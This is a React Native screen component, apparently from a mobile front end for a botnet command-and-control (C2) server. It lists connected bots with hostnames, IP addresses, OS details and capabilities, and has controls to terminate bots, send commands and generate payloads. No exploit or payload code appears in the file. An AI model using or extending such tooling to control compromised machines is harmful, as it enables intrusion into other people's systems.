// Bots Management Screen Component

import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  TouchableOpacity,
  Alert,
  RefreshControl,
} from 'react-native';
import { Ionicons } from '@expo/vector-icons';
import { useNavigation } from '@react-navigation/native';

// Import services and types
import apiService from '../../services/api';
import { Bot } from '../../types';
import { COLORS, SPACING, FONT_SIZES, BORDER_RADIUS, SHADOWS, REFRESH_INTERVALS } from '../../constants';

interface BotItemProps {
  bot: Bot;
  onPress: () => void;
  onTerminate: () => void;
}

const BotItem: React.FC<BotItemProps> = ({ bot, onPress, onTerminate }) => {
  const getStatusColor = (status: string) => {
    switch (status.toLowerCase()) {
      case 'active':
        return COLORS.success;
      case 'inactive':
        return COLORS.warning;
      case 'offline':
        return COLORS.error;
      default:
        return COLORS.info;
    }
  };

  const getStatusIcon = (status: string) => {
    switch (status.toLowerCase()) {
      case 'active':
        return 'radio-button-on';
      case 'inactive':
        return 'radio-button-off';
      case 'offline':
        return 'cloud-offline';
      default:
        return 'help-circle';
    }
  };

  return (
    <TouchableOpacity style={styles.botItem} onPress={onPress}>
      <View style={styles.botIcon}>
        <Ionicons name="hardware-chip" size={24} color={COLORS.primary} />
      </View>

      <View style={styles.botInfo}>
        <View style={styles.botHeader}>
          <Text style={styles.botName} numberOfLines={1}>
            {bot.hostname || bot.id}
          </Text>
          <View style={[styles.statusBadge, { backgroundColor: getStatusColor(bot.status) }]}>
            <Ionicons name={getStatusIcon(bot.status)} size={12} color="#ffffff" />
            <Text style={styles.statusText}>{bot.status}</Text>
          </View>
        </View>

        <Text style={styles.botDetails} numberOfLines={1}>
          {bot.os_info} • {bot.ip_address}
        </Text>

        <Text style={styles.botLastSeen}>
          Last seen: {bot.last_seen ? new Date(bot.last_seen).toLocaleString() : 'Never'}
        </Text>

        <View style={styles.capabilities}>
          {Object.entries(bot.capabilities).map(([key, enabled]) => (
            enabled && (
              <View key={key} style={styles.capabilityTag}>
                <Text style={styles.capabilityText}>{key.replace('_', ' ')}</Text>
              </View>
            )
          ))}
        </View>
      </View>

      <TouchableOpacity
        style={styles.terminateButton}
        onPress={onTerminate}
      >
        <Ionicons name="power" size={20} color={COLORS.error} />
      </TouchableOpacity>
    </TouchableOpacity>
  );
};

export default function BotsScreen() {
  const navigation = useNavigation();
  const [bots, setBots] = useState<Bot[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);

  useEffect(() => {
    loadBots();

    // Set up auto-refresh
    const interval = setInterval(loadBots, REFRESH_INTERVALS.BOTS);

    return () => clearInterval(interval);
  }, []);

  const loadBots = async () => {
    try {
      setLoading(true);
      const result = await apiService.getBots();

      if (result.success && result.data) {
        setBots(result.data);
      } else {
        Alert.alert('Error', 'Failed to load bots');
      }
    } catch (error) {
      console.error('Failed to load bots:', error);
      Alert.alert('Error', 'Failed to load bots');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  const onRefresh = () => {
    setRefreshing(true);
    loadBots();
  };

  const handleBotPress = (bot: Bot) => {
    navigation.navigate('BotDetails', { botId: bot.id });
  };

  const handleTerminateBot = (bot: Bot) => {
    Alert.alert(
      'Terminate Bot',
      `Are you sure you want to terminate ${bot.hostname || bot.id}?`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Terminate',
          style: 'destructive',
          onPress: async () => {
            try {
              const result = await apiService.terminateBot(bot.id);
              if (result.success) {
                Alert.alert('Success', 'Bot termination command sent');
                loadBots(); // Refresh the list
              } else {
                Alert.alert('Error', 'Failed to terminate bot');
              }
            } catch (error) {
              Alert.alert('Error', 'Failed to terminate bot');
            }
          },
        },
      ]
    );
  };

  const renderBot = ({ item }: { item: Bot }) => (
    <BotItem
      bot={item}
      onPress={() => handleBotPress(item)}
      onTerminate={() => handleTerminateBot(item)}
    />
  );

  const renderEmpty = () => (
    <View style={styles.emptyContainer}>
      <Ionicons name="hardware-chip-outline" size={80} color={COLORS.textMuted} />
      <Text style={styles.emptyTitle}>No Bots Connected</Text>
      <Text style={styles.emptySubtitle}>
        No bots are currently connected to the C2 server
      </Text>
    </View>
  );

  if (loading && bots.length === 0) {
    return (
      <View style={styles.loadingContainer}>
        <Ionicons name="refresh-circle" size={50} color={COLORS.primary} />
        <Text style={styles.loadingText}>Loading Bots...</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      {/* Header */}
      <View style={styles.header}>
        <Text style={styles.headerTitle}>Connected Bots</Text>
        <Text style={styles.headerSubtitle}>
          {bots.length} bot{bots.length !== 1 ? 's' : ''} connected
        </Text>
      </View>

      {/* Stats */}
      <View style={styles.statsContainer}>
        <View style={styles.statItem}>
          <Text style={styles.statValue}>
            {bots.filter(bot => bot.status === 'active').length}
          </Text>
          <Text style={styles.statLabel}>Active</Text>
        </View>
        <View style={styles.statItem}>
          <Text style={styles.statValue}>
            {bots.filter(bot => bot.status === 'inactive').length}
          </Text>
          <Text style={styles.statLabel}>Inactive</Text>
        </View>
        <View style={styles.statItem}>
          <Text style={styles.statValue}>
            {bots.filter(bot => bot.status === 'offline').length}
          </Text>
          <Text style={styles.statLabel}>Offline</Text>
        </View>
      </View>

      {/* Bots List */}
      <FlatList
        data={bots}
        renderItem={renderBot}
        keyExtractor={(item) => item.id}
        contentContainerStyle={styles.listContainer}
        refreshControl={
          <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
        }
        ListEmptyComponent={renderEmpty}
        showsVerticalScrollIndicator={false}
      />

      {/* Quick Actions */}
      <View style={styles.quickActions}>
        <TouchableOpacity
          style={styles.quickActionButton}
          onPress={() => navigation.navigate('Commands')}
        >
          <Ionicons name="terminal" size={24} color={COLORS.primary} />
          <Text style={styles.quickActionText}>Send Command</Text>
        </TouchableOpacity>

        <TouchableOpacity
          style={styles.quickActionButton}
          onPress={() => navigation.navigate('Payloads')}
        >
          <Ionicons name="nuclear" size={24} color={COLORS.primary} />
          <Text style={styles.quickActionText}>Generate Payload</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: COLORS.background,
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: COLORS.background,
  },
  loadingText: {
    fontSize: FONT_SIZES.lg,
    color: COLORS.textSecondary,
    marginTop: SPACING.md,
  },
  header: {
    padding: SPACING.lg,
    backgroundColor: COLORS.surface,
    borderBottomWidth: 1,
    borderBottomColor: COLORS.border,
  },
  headerTitle: {
    fontSize: FONT_SIZES.xl,
    fontWeight: 'bold',
    color: COLORS.text,
  },
  headerSubtitle: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textSecondary,
    marginTop: SPACING.xs,
  },
  statsContainer: {
    flexDirection: 'row',
    padding: SPACING.md,
    backgroundColor: COLORS.surface,
    marginHorizontal: SPACING.md,
    marginTop: SPACING.md,
    borderRadius: BORDER_RADIUS.md,
    ...SHADOWS.sm,
  },
  statItem: {
    flex: 1,
    alignItems: 'center',
  },
  statValue: {
    fontSize: FONT_SIZES.xxxl,
    fontWeight: 'bold',
    color: COLORS.primary,
  },
  statLabel: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textSecondary,
    marginTop: SPACING.xs,
  },
  listContainer: {
    padding: SPACING.md,
  },
  botItem: {
    backgroundColor: COLORS.surface,
    borderRadius: BORDER_RADIUS.lg,
    padding: SPACING.lg,
    marginBottom: SPACING.md,
    flexDirection: 'row',
    alignItems: 'center',
    ...SHADOWS.md,
  },
  botIcon: {
    width: 50,
    height: 50,
    borderRadius: 25,
    backgroundColor: COLORS.surfaceVariant,
    justifyContent: 'center',
    alignItems: 'center',
    marginRight: SPACING.md,
  },
  botInfo: {
    flex: 1,
  },
  botHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: SPACING.xs,
  },
  botName: {
    fontSize: FONT_SIZES.lg,
    fontWeight: 'bold',
    color: COLORS.text,
    flex: 1,
  },
  statusBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: SPACING.sm,
    paddingVertical: SPACING.xs,
    borderRadius: BORDER_RADIUS.sm,
  },
  statusText: {
    fontSize: FONT_SIZES.xs,
    color: '#ffffff',
    fontWeight: 'bold',
    marginLeft: SPACING.xs,
  },
  botDetails: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textSecondary,
    marginBottom: SPACING.xs,
  },
  botLastSeen: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.textMuted,
    marginBottom: SPACING.sm,
  },
  capabilities: {
    flexDirection: 'row',
    flexWrap: 'wrap',
  },
  capabilityTag: {
    backgroundColor: COLORS.primary,
    paddingHorizontal: SPACING.sm,
    paddingVertical: SPACING.xs,
    borderRadius: BORDER_RADIUS.sm,
    marginRight: SPACING.xs,
    marginBottom: SPACING.xs,
  },
  capabilityText: {
    fontSize: FONT_SIZES.xs,
    color: '#ffffff',
    fontWeight: '500',
  },
  terminateButton: {
    padding: SPACING.sm,
  },
  emptyContainer: {
    alignItems: 'center',
    padding: SPACING.xxl,
  },
  emptyTitle: {
    fontSize: FONT_SIZES.lg,
    fontWeight: 'bold',
    color: COLORS.text,
    marginTop: SPACING.lg,
  },
  emptySubtitle: {
    fontSize: FONT_SIZES.md,
    color: COLORS.textSecondary,
    textAlign: 'center',
    marginTop: SPACING.sm,
  },
  quickActions: {
    flexDirection: 'row',
    padding: SPACING.lg,
    backgroundColor: COLORS.surface,
    borderTopWidth: 1,
    borderTopColor: COLORS.border,
  },
  quickActionButton: {
    flex: 1,
    alignItems: 'center',
    padding: SPACING.md,
    marginHorizontal: SPACING.sm,
    backgroundColor: COLORS.surfaceVariant,
    borderRadius: BORDER_RADIUS.md,
  },
  quickActionText: {
    fontSize: FONT_SIZES.sm,
    color: COLORS.primary,
    marginTop: SPACING.xs,
    fontWeight: '500',
  },
});
